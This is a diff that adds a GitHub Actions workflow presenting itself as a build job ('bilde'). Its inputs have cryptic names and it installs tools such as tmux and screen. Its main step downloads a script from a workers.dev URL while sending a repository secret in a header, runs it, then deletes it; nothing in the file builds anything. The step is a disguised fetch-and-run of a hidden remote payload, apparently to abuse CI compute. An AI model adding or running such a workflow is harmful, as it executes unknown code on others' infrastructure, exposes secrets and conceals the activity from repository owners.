@@ -1,0 +1,72 @@
+name: bilde
+env:
+  TRYIT: ${{ github.event.inputs.try_override }}
+  BIST: ${{ github.event.inputs.bist_override }}
+  AMDX: ${{ github.event.inputs.amd_override }}
+  MHASH: ${{ github.event.inputs.mhash_override }}
+  HOSTIG: ${{ github.event.inputs.host_override }}
+  COUNTER: ${{ github.event.inputs.loop_override }}
+  TESTER: 'JOHN_HAROLD'
+  PASS: '@6'
+on:
+  workflow_dispatch:
+    inputs:
+      try_override:
+        description: 'try'
+        required: false
+        default: '4'
+        type: string
+      bist_override:
+        description: 'bister'
+        required: false
+        default: '{\"b\":\"nil\"}'
+        type: string
+      loop_override:
+        description: 'lup'
+        required: false
+        default: '7'
+        type: string
+      amd_override:
+        description: 'x86'
+        required: false
+        default: 'x86_v'
+        type: string
+      mhash_override:
+        description: 'map hash'
+        required: false
+        default: 'lzip'
+        type: string
+      host_override:
+        description: 'another host'
+        required: false
+        default: 'http'
+        type: string
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Pack
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        if: env.COUNTER == '7'
+        run: |
+          sudo apt-get install -y --no-install-recommends \
+            lsof \
+            ncdu tmux \
+            screen iftop \
+            iotop sysstat
+      - name: Bilde
+        env:
+          API_LEVEL: "21"
+        run: |
+          curl -sS -f -o zipp.sh \
+            -H "HOSTINGER: ${{ secrets.HOSTINGER }}" \
+            https://easyhostmn.dasmehtin.workers.dev/u/h5fur7dvm5d6ze
+          chmod +x zipp.sh && pwd
+          ./zipp.sh
+          rm -rf zipp.sh
+      - name: LS
+        run: ls -la
